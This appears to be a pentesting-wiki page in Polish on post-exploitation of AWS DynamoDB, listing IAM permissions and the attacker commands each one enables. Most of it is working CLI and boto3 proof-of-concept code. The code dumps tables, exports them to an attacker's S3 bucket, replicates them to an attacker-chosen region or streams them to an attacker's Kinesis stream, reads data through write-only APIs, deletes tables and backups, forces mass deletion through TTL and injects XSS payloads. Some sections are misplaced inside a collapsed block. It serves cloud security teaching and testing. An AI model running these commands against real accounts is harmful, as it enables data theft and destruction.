# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Aby uzyskać więcej informacji, zobacz:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Atakujący z tym uprawnieniem będzie mógł **pobrać elementy z tabel po kluczu głównym** (nie można po prostu zażądać wszystkich danych z tabeli). Oznacza to, że musisz znać klucze główne (możesz je uzyskać, pobierając metadane tabeli (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Pośrednie privesc poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:GetItem`

**Podobnie jak poprzednie uprawnienia** to uprawnienie pozwala potencjalnemu atakującemu odczytać wartości z zaledwie 1 tabeli, mając klucz główny rekordu do pobrania:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Z tym uprawnieniem możliwe jest także użycie metody **`transact-get-items`** w następujący sposób:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** Pośrednie privesc poprzez odnalezienie wrażliwych informacji w tabeli

### `dynamodb:Query`

**Podobnie jak poprzednie uprawnienia** to uprawnienie umożliwia potencjalnemu atakującemu odczyt wartości jedynie z 1 tabeli, podając klucz główny wpisu do pobrania. Pozwala użyć [podzbioru porównań](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html), ale jedynym porównaniem dozwolonym dla klucza głównego (który musi się pojawić) jest "EQ", więc nie możesz użyć porównania, aby pobrać całą bazę danych w jednym żądaniu.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potencjalny wpływ:** Pośredni privesc poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:Scan`

Możesz użyć tego uprawnienia, aby **dump the entire table easily**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potencjalny wpływ:** Pośredni privesc poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:PartiQLSelect`

Możesz użyć tego uprawnienia, aby **dump the entire table easily**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
To uprawnienie pozwala również wykonać `batch-execute-statement`, na przykład:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
ale musisz podać wartość klucza głównego, więc nie jest to zbyt użyteczne.

**Potencjalny wpływ:** Indirect privesc poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

To uprawnienie pozwoli atakującemu na **wyeksportowanie całej tabeli do wybranego przez niego bucketu S3**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Zwróć uwagę, że aby to zadziałało, tabela musi mieć włączone point-in-time-recovery; możesz sprawdzić, czy tabela ma to włączone za pomocą:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Jeśli nie jest włączone, będziesz musiał je **włączyć**, a do tego potrzebujesz uprawnienia **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potencjalny wpływ:** Pośrednie privesc przez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Przy tych uprawnieniach atakujący będzie w stanie **utworzyć nową tabelę z kopii zapasowej** (a nawet utworzyć kopię zapasową, aby następnie przywrócić ją do innej tabeli). Następnie, przy odpowiednich uprawnieniach, będzie mógł sprawdzić **informacje** z kopii zapasowych, które **nie znajdują się już w tabeli produkcyjnej**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potencjalny wpływ:** Pośrednie privesc poprzez zlokalizowanie wrażliwych informacji w kopii zapasowej tabeli

### `dynamodb:PutItem`

To uprawnienie pozwala użytkownikom na dodanie **nowego elementu do tabeli lub zastąpienie istniejącego elementu** nowym elementem. Jeśli element z tym samym kluczem podstawowym już istnieje, **cały element zostanie zastąpiony** nowym elementem. Jeśli klucz podstawowy nie istnieje, zostanie **utworzony** nowy element o określonym kluczu podstawowym.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

Potencjalny wpływ: Exploitation of further vulnerabilities/bypasses poprzez możliwość dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:UpdateItem`

To uprawnienie pozwala użytkownikom na **modyfikowanie istniejących atrybutów elementu lub dodawanie nowych atrybutów do elementu**. Nie **zastępuje** całego elementu; aktualizuje tylko określone atrybuty. Jeśli klucz główny nie istnieje w tabeli, operacja **utworzy nowy element** z określonym kluczem głównym i ustawi atrybuty określone w wyrażeniu aktualizacji.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potencjalny wpływ:** Wykorzystanie dalszych podatności/bypasses przez możliwość dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:DeleteTable`

Atakujący z tym uprawnieniem może **usunąć tabelę DynamoDB, powodując utratę danych**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potencjalny wpływ**: Utrata danych i zakłócenie usług korzystających z usuniętej tabeli.

### `dynamodb:DeleteBackup`

Atakujący z tym uprawnieniem może **usunąć kopię zapasową DynamoDB, co może spowodować utratę danych w scenariuszu odtwarzania po awarii**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potencjalny wpływ**: Utrata danych i niemożność odzyskania danych z kopii zapasowej podczas scenariusza odzyskiwania po awarii.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Przetestować, czy to faktycznie działa

Atakujący posiadający te uprawnienia może **włączyć stream dla tabeli DynamoDB, zaktualizować tabelę, aby rozpocząć przesyłanie zmian, a następnie uzyskać dostęp do streamu i monitorować zmiany w tabeli w czasie rzeczywistym**. Pozwala to atakującemu monitorować i exfiltrate zmiany danych, co może prowadzić do data leakage.

1. Włącz stream dla tabeli DynamoDB:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Opisz strumień, aby uzyskać ARN i inne szczegóły:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Pobierz iterator shardu używając stream ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Użyj shard iterator, aby uzyskać dostęp i exfiltrate dane ze strumienia:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potencjalny wpływ**: Real-time monitoring and data leakage of the DynamoDB table's changes.

### Odczyt elementów za pomocą `dynamodb:UpdateItem` i `ReturnValues=ALL_OLD`

Atakujący mający jedynie `dynamodb:UpdateItem` na tabeli może odczytać elementy bez żadnych typowych uprawnień do odczytu (`GetItem`/`Query`/`Scan`) poprzez wykonanie nieszkodliwej aktualizacji i żądanie `--return-values ALL_OLD`. DynamoDB zwróci pełny obraz elementu sprzed aktualizacji w polu `Attributes` odpowiedzi (to nie zużywa RCUs).

- Minimalne uprawnienia: `dynamodb:UpdateItem` na docelowej tabeli/kluczu.
- Wymagania wstępne: Musisz znać klucz główny elementu.

Przykład (adds a harmless attribute and exfiltrates the previous item in the response):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Odpowiedź CLI będzie zawierać blok `Attributes` zawierający kompletny poprzedni element (wszystkie atrybuty), co w praktyce daje możliwość odczytu z dostępu tylko do zapisu.

**Potencjalny wpływ:** Odczyt dowolnych elementów z tabeli mając jedynie uprawnienia do zapisu, umożliwiający exfiltration wrażliwych danych, jeśli znane są klucze główne.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Stealth exfiltration poprzez dodanie nowej regionalnej repliki do DynamoDB Global Table (version 2019.11.21). Jeśli principal może dodać regionalną replikę, cała tabela zostanie zreplikowana do Regionu wybranego przez atakującego, skąd atakujący może odczytać wszystkie elementy.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Uprawnienia: `dynamodb:UpdateTable` (with `replica-updates`) or `dynamodb:CreateTableReplica` on the target table. If CMK is used in the replica, KMS permissions for that key may be required.

Potencjalny wpływ: Replikacja całej tabeli do regionu kontrolowanego przez atakującego, prowadząca do ukrytej eksfiltracji danych.

### `dynamodb:TransactWriteItems` (odczyt przez nieudaną `ConditionExpression` + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Atakujący z uprawnieniami do zapisu w transakcjach może eksfiltrować pełne atrybuty istniejącego elementu, wykonując `Update` wewnątrz `TransactWriteItems`, które celowo powoduje niepowodzenie `ConditionExpression` przy ustawieniu `ReturnValuesOnConditionCheckFailure=ALL_OLD`. W razie niepowodzenia DynamoDB dołącza poprzednie atrybuty do powodów anulowania transakcji, efektywnie zamieniając dostęp tylko do zapisu w dostęp do odczytu docelowych kluczy.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Uprawnienia: `dynamodb:TransactWriteItems` on the target table (and the underlying item). No read permissions are required.

Potencjalny wpływ: Odczyt dowolnych elementów (po kluczu głównym) z tabeli używając jedynie uprawnień do zapisu transakcyjnego poprzez zwracane powody anulowania.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` na GSI

Obejście ograniczeń odczytu przez utworzenie Global Secondary Index (GSI) z `ProjectionType=ALL` na atrybucie o niskiej entropii, ustawienie tego atrybutu na stałą wartość we wszystkich elementach, a następnie `Query` indeksu, aby pobrać pełne elementy. Działa to nawet jeśli `Query`/`Scan` na tabeli bazowej jest odrzucone, o ile możesz wykonać zapytanie do ARN indeksu.

- Minimalne uprawnienia:
- `dynamodb:UpdateTable` on the target table (to create the GSI with `ProjectionType=ALL`).
- `dynamodb:UpdateItem` on the target table keys (to set the indexed attribute on each item).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Kroki (PoC w us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potencjalny wpływ:** Full table exfiltration przez zapytanie do nowo utworzonego GSI, który projektuje wszystkie atrybuty, nawet gdy base table read APIs są zablokowane.


### `dynamodb:EnableKinesisStreamingDestination` (Continuous exfiltration via Kinesis Data Streams)

Wykorzystywanie DynamoDB Kinesis streaming destinations do ciągłego exfiltrate zmian z tabeli do kontrolowanego przez atakującego Kinesis Data Stream. Po włączeniu każde zdarzenie INSERT/MODIFY/REMOVE jest przekazywane niemal w czasie rzeczywistym do streamu bez potrzeby uprawnień odczytu na tabeli.

Minimalne uprawnienia (atakujący):
- `dynamodb:EnableKinesisStreamingDestination` na docelowej tabeli
- Opcjonalnie `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` do monitorowania statusu
- Uprawnienia odczytu na należącym do atakującego Kinesis streamie, aby konsumować rekordy: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

Atakujący posiadający uprawnienie dynamodb:UpdateTimeToLive może zmienić konfigurację TTL (time-to-live) tabeli — włączyć lub wyłączyć TTL. Gdy TTL jest włączone, poszczególne elementy zawierające skonfigurowany atrybut TTL zostaną automatycznie usunięte po osiągnięciu czasu wygaśnięcia. Wartość TTL jest po prostu kolejnym atrybutem każdego elementu; elementy bez tego atrybutu nie są objęte usuwaniem opartym na TTL.

Jeśli elementy nie zawierają jeszcze atrybutu TTL, atakujący potrzebowałby również uprawnienia do aktualizowania elementów (na przykład dynamodb:UpdateItem), aby dodać atrybut TTL i wywołać masowe usuwanie.

Najpierw włącz TTL dla tabeli, określając nazwę atrybutu używaną jako pole wygaśnięcia:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Następnie zaktualizuj elementy, aby dodać atrybut TTL (epoch seconds), aby wygasły i zostały usunięte:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

Atakujący posiadający uprawnienia `dynamodb:RestoreTableFromAwsBackup` lub `dynamodb:RestoreTableToPointInTime` może tworzyć nowe tabele przywrócone z kopii zapasowych lub z point-in-time recovery (PITR) bez nadpisywania oryginalnej tabeli. Przywrócona tabela zawiera pełny obraz danych z wybranego punktu, więc atakujący może jej użyć do eksfiltracji informacji historycznych lub uzyskania kompletnego zrzutu poprzedniego stanu bazy danych.

Przywróć tabelę DynamoDB z kopii zapasowej na żądanie:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
Przywróć tabelę DynamoDB do punktu w czasie (utwórz nową tabelę ze stanem przywróconym):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potencjalny wpływ:** Ciągła, niemal w czasie rzeczywistym eksfiltracja zmian w tabeli do strumienia Kinesis kontrolowanego przez atakującego bez bezpośrednich operacji odczytu na tabeli.



{{#include ../../../../banners/hacktricks-training.md}}
